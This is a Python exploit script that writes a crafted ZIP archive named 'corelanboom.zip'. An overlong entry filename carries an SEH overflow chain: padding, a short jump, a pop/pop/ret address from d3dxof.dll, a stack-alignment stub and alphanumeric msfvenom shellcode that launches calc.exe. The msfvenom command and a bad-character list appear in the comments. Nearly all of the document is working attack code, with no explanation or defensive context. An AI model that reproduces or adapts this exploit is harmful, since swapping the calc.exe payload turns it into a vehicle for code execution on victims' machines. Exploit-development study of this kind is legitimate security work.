import struct

ldf_header = "\x50\x4B\x03\x04\x14\x00\x00" + \
             "\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00"

cdf_header = "\x50\x4B\x01\x02\x14\x00\x14" + \
             "\x00\x00\x00\x00\x00\xB7\xAC\xCE\x34\x00\x00\x00" + \
             "\x00\x00\x00\x00\x00\x00\x00\x00\x00" + \
             "\xe4\x0f" + \
             "\x00\x00\x00\x00\x00\x00\x01\x00" + \
             "\x24\x00\x00\x00\x00\x00\x00\x00"

eofcdf_header = "\x50\x4B\x05\x06\x00\x00\x00\x00\x01\x00\x01\x00" + \
                    "\x12\x10\x00\x00" + \
                    "\x02\x10\x00\x00" + \
                    "\x00\x00"

#
# msfvenom -p windows/exec cmd=calc.exe -a x86 --platform windows -f python -e x86/alpha_mixed
# -b '\x22\x2a\x2f\x3c\x3e\x3f\x5c\x7b\x00' BufferRegister=ECX > calc.py
#
# bad cars : printable chars mentioned below
# windows/exec cmd=calc.exe x86/alpha_mixed
# Size = 439
#
# ALL printable ascii only less :
#
# " (double quote) : 0x22
# * (asterisk) : 0x2a
# / (forward slash) : 0x2f
# : (colon - sometimes works, but is actually NTFS Alternate Data Streams) : 0x3A
# < (less than) : 0x3c
# > (greater than) : 0x3e
# ? (question mark) : 0x3f
# \ (backslash) : 0x5c
# | (vertical bar or pipe) : 0x7b
shellcode =  ""
shellcode += "\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
shellcode += "\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41"
shellcode += "\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30"
shellcode += "\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x6b"
shellcode += "\x4c\x7a\x48\x6e\x62\x63\x30\x65\x50\x77\x70\x33\x50"
shellcode += "\x6f\x79\x5a\x45\x54\x71\x39\x50\x73\x54\x4c\x4b\x50"
shellcode += "\x50\x50\x30\x6c\x4b\x32\x72\x66\x6c\x6e\x6b\x31\x42"
shellcode += "\x32\x34\x4e\x6b\x71\x62\x57\x58\x76\x6f\x6f\x47\x42"
shellcode += "\x6a\x57\x56\x76\x51\x39\x6f\x6c\x6c\x65\x6c\x31\x71"
shellcode += "\x63\x4c\x36\x62\x54\x6c\x77\x50\x39\x51\x7a\x6f\x44"
shellcode += "\x4d\x56\x61\x68\x47\x6a\x42\x4a\x52\x36\x32\x52\x77"
shellcode += "\x6e\x6b\x33\x62\x34\x50\x6e\x6b\x43\x7a\x57\x4c\x4e"
shellcode += "\x6b\x62\x6c\x67\x61\x54\x38\x49\x73\x62\x68\x53\x31"
shellcode += "\x6e\x31\x66\x31\x4c\x4b\x30\x59\x37\x50\x57\x71\x6a"
shellcode += "\x73\x6e\x6b\x32\x69\x54\x58\x6b\x53\x37\x4a\x70\x49"
shellcode += "\x4e\x6b\x36\x54\x6c\x4b\x47\x71\x49\x46\x66\x51\x39"
shellcode += "\x6f\x6e\x4c\x69\x51\x7a\x6f\x54\x4d\x55\x51\x49\x57"
shellcode += "\x64\x78\x69\x70\x72\x55\x4b\x46\x53\x33\x31\x6d\x38"
shellcode += "\x78\x47\x4b\x43\x4d\x31\x34\x42\x55\x78\x64\x43\x68"
shellcode += "\x6c\x4b\x63\x68\x45\x74\x75\x51\x68\x53\x45\x36\x6c"
shellcode += "\x4b\x44\x4c\x72\x6b\x4e\x6b\x72\x78\x77\x6c\x35\x51"
shellcode += "\x6b\x63\x4e\x6b\x34\x44\x4e\x6b\x66\x61\x38\x50\x6d"
shellcode += "\x59\x51\x54\x55\x74\x37\x54\x51\x4b\x63\x6b\x63\x51"
shellcode += "\x52\x79\x31\x4a\x42\x71\x59\x6f\x49\x70\x71\x4f\x43"
shellcode += "\x6f\x50\x5a\x4e\x6b\x57\x62\x7a\x4b\x4e\x6d\x61\x4d"
shellcode += "\x70\x6a\x73\x31\x4c\x4d\x4d\x55\x4e\x52\x63\x30\x65"
shellcode += "\x50\x67\x70\x76\x30\x50\x68\x50\x31\x4e\x6b\x62\x4f"
shellcode += "\x6f\x77\x79\x6f\x39\x45\x6d\x6b\x78\x70\x6d\x65\x69"
shellcode += "\x32\x63\x66\x63\x58\x59\x36\x6d\x45\x6d\x6d\x6d\x4d"
shellcode += "\x6b\x4f\x7a\x75\x67\x4c\x33\x36\x53\x4c\x37\x7a\x4d"
shellcode += "\x50\x79\x6b\x39\x70\x33\x45\x55\x55\x6f\x4b\x77\x37"
shellcode += "\x42\x33\x42\x52\x72\x4f\x43\x5a\x43\x30\x51\x43\x59"
shellcode += "\x6f\x5a\x75\x61\x73\x33\x51\x72\x4c\x75\x33\x76\x4e"
shellcode += "\x52\x45\x51\x68\x30\x65\x55\x50\x41\x41"

alpha_align_stack = "\x59\x59\x59" \
                    "\x5c" \
                    "\x61\x61\x61" \
                    "\x54" \
                    "\x59" \
                    "\x74\x33"

jmpcode = "\x74\x20\x41\x41"
ret = struct.pack('<L', 0x6d7e467b) # p/p/r from d3dxof.dll
pre_payload = "A"*297 + jmpcode + ret + "B"*26 + alpha_align_stack + "F"*0x33 + shellcode
payload = pre_payload + "C"*(4064-len(pre_payload)) + ".txt"

print "Size : %d" % len(payload)

with open('./corelanboom.zip', 'wb') as f:
    f.write(ldf_header + payload + cdf_header + payload + eofcdf_header)
